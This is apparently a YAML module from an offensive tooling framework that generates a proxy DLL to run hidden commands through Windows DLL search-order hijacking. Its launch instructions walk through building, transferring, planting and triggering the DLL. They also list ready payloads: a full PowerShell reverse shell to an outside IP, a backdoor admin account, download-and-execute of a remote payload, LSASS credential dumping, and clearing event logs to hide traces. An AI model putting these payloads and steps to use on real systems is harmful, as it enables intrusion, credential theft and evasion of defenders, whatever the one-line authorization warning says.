meta:
  name: "DLL Proxy with Command Execution (C++)"
  category: "Privilege Escalation"
  description: |
    Generates a proxy DLL that forwards all exports to the original DLL
    while executing a custom command on DLL_PROCESS_ATTACH.

    Features:
    - Automatic export forwarding to legitimate DLL
    - Command execution on DLL load (hidden window)
    - Uses CreateProcessA with CREATE_NO_WINDOW flag
    - Leverages DLL search order hijacking for privilege escalation

    This technique is useful for DLL hijacking attacks where you want to
    maintain the original DLL's functionality while executing your payload.

    Workflow:
    1. Generate proxy DLL from target DLL using perfect-dll-proxy
    2. Inject command execution code into DLL_PROCESS_ATTACH
    3. Compile to DLL
    4. Replace original DLL (requires write access)

    WARNING: For authorized security testing only!

  effectiveness: high

  mitre:
    tactic: "TA0004 - Privilege Escalation"
    technique: "T1574.001 - Hijack Execution Flow: DLL"

  artifacts:
    - "Proxy DLL file replacing legitimate DLL"
    - "CreateProcessA API calls on DLL load"
    - "Hidden process execution (CREATE_NO_WINDOW)"
    - "Export forwarding pragma directives in binary"
    - "Potentially suspicious DLL load order behavior"

parameters:
  - name: "target_dll"
    type: "path"
    description: "Path to the legitimate DLL to proxy (e.g., 'C:\\Windows\\System32\\version.dll')"
    required: true

  - name: "command"
    type: "string"
    description: "Command to execute on DLL load (e.g., 'cmd.exe /c whoami > C:\\temp\\output.txt')"
    required: false
    default: "cmd.exe /c calc.exe"

  - name: "output_file"
    type: "string"
    description: "Output DLL filename (should match original DLL name)"
    required: false
    default: "proxy.dll"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated DLL"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate proxy DLL C++ source using perfect-dll-proxy
  - type: "command"
    name: "generate_proxy_cpp"
    command: "perfect-dll-proxy --output /tmp/proxy_$$.cpp {{ target_dll }} && echo /tmp/proxy_$$.cpp"
    output_var: "raw_cpp_path"

  # Step 2: Inject command execution into DLL_PROCESS_ATTACH
  - type: "script"
    name: "inject_command"
    script: "inject_dll_proxy_command.py"
    args:
      cpp_content: "{{ raw_cpp_path }}"
      command: "{{ command }}"
    output_var: "modified_cpp"

output:
  type: "template"
  template: "privilege_escalation/dll_proxy.cpp"
  compile:
    enabled: true
    command: "nix-shell -p pkgsCross.mingwW64.buildPackages.gcc --run 'x86_64-w64-mingw32-g++ -shared -o {{ output_path }}/{{ output_file }} {{ source_file }} -static-libgcc -static-libstdc++ -s'"
  launch_instructions: |
    # Identify DLL Hijacking Opportunity

    Use tools to identify vulnerable DLL search paths:

    ```bash
    # On target system (requires admin/local access)
    procmon.exe  # Filter for "NAME NOT FOUND" on DLL loads
    ```

    Or use automated tools:
    ```powershell
    Spartacus.exe --mode dll --procmon "C:\Users\User\Downloads\ProcessMonitor\Procmon64.exe" --pml "C:\Users\User\Documents\test\log.log" --csv "C:\Users\User\Documents\test\output.csv" --solution "C:\Users\User\Documents\test" --verbose
    ```

    # Prepare Proxy DLL

    The generated DLL: `{{ output_file }}`
    - Proxies all exports to: `{{ target_dll }}`
    - Executes command: `{{ command }}`

    # Transfer to Target

    **HTTP Server:**
    ```bash
    python3 -m http.server 80
    ```

    **Download on target:**
    ```powershell
    Invoke-WebRequest -Uri "http://<attacker-ip>/{{ output_file }}" -OutFile "{{ output_file }}"
    ```

    **SMB Share:**
    ```bash
    smbserver.py share . -smb2support
    ```

    # Deploy DLL

    **Option 1: Replace legitimate DLL (requires write access)**
    ```powershell
    # Backup original
    Copy-Item "C:\VulnerableApp\{{ output_file }}" "C:\VulnerableApp\{{ output_file }}.bak"

    # Replace with proxy
    Copy-Item "{{ output_file }}" "C:\VulnerableApp\{{ output_file }}" -Force
    ```

    **Option 2: Place in writable directory in DLL search path**
    ```powershell
    # Copy to application directory
    Copy-Item "{{ output_file }}" "C:\VulnerableApp\{{ output_file }}"
    ```

    **Option 3: Place in current working directory**
    ```powershell
    # If application loads DLLs from CWD
    Copy-Item "{{ output_file }}" "%USERPROFILE%\Desktop\{{ output_file }}"
    ```

    # Trigger Execution

    **Restart vulnerable service:**
    ```powershell
    Restart-Service VulnerableService
    ```

    **Launch application:**
    ```powershell
    Start-Process "C:\VulnerableApp\vulnerable.exe"
    ```

    **Wait for scheduled task/login:**
    - Some applications load on user login
    - Scheduled tasks may load specific DLLs
    - System services load on boot

    # Notes

    - Command executes when DLL is loaded: `{{ command }}`
    - Uses hidden window (CREATE_NO_WINDOW + SW_HIDE)
    - All exports forwarded to original DLL at: `{{ target_dll }}`
    - Application functionality remains intact
    - Command runs in context of the process loading the DLL
    - Multiple executions possible if DLL loaded multiple times
    - Consider escaping special characters in command parameter
    - Proxy DLL must match architecture of target process (x64/x86)
    - Original DLL path in proxy is absolute - ensure it's accessible
    - Some DLLs are protected by Windows File Protection (WFP)

    # Troubleshooting

    - **Application crashes:** Verify target DLL path is correct and accessible
    - **Command doesn't execute:** Check if DLL is actually being loaded (use Process Monitor)
    - **Access denied:** Need write permissions to DLL directory or writable directory in search path
    - **Wrong architecture:** Ensure proxy DLL matches process architecture (x64 vs x86)
    - **DLL not loaded:** Verify DLL search order - application may find legitimate DLL first
    - **Application won't start:** Original DLL path in proxy may be incorrect
    - **Command syntax errors:** Escape quotes and special characters properly
    - **AV detection:** Proxy DLLs with CreateProcess are commonly flagged
    - Use Process Monitor to verify DLL load order and paths
    - Check Event Viewer for application errors

    # DLL Search Order

    Windows DLL search order (SafeDllSearchMode enabled - default):
    1. Directory from which application loaded
    2. System directory (C:\Windows\System32)
    3. 16-bit system directory (C:\Windows\System)
    4. Windows directory (C:\Windows)
    5. Current working directory
    6. Directories in PATH environment variable

    # Example Commands

    **Reverse shell:**
    ```
    cmd.exe /c powershell -ep bypass -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```

    **Add local admin:**
    ```
    cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add
    ```

    **Download and execute:**
    ```
    cmd.exe /c powershell -ep bypass -c "IWR -Uri http://10.10.14.5/payload.exe -OutFile C:\Windows\Temp\payload.exe; Start-Process C:\Windows\Temp\payload.exe"
    ```

    **Credential dumping:**
    ```
    cmd.exe /c powershell -ep bypass -c "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 632 C:\Windows\Temp\lsass.dmp full"
    ```

    # Cleanup

    **Remove proxy DLL:**
    ```powershell
    Remove-Item "C:\VulnerableApp\{{ output_file }}" -Force
    ```

    **Restore original:**
    ```powershell
    Move-Item "C:\VulnerableApp\{{ output_file }}.bak" "C:\VulnerableApp\{{ output_file }}" -Force
    ```

    **Clear logs:**
    ```powershell
    wevtutil cl Application
    wevtutil cl System
    ```

    # Security Note

    DLL hijacking requires:
    - Write access to a directory in the DLL search path, OR
    - Ability to modify DLL search path, OR  
    - Replace legitimate DLL (requires elevated privileges)

    This is a powerful privilege escalation technique when vulnerable applications run with elevated privileges. Always obtain proper authorization before testing.
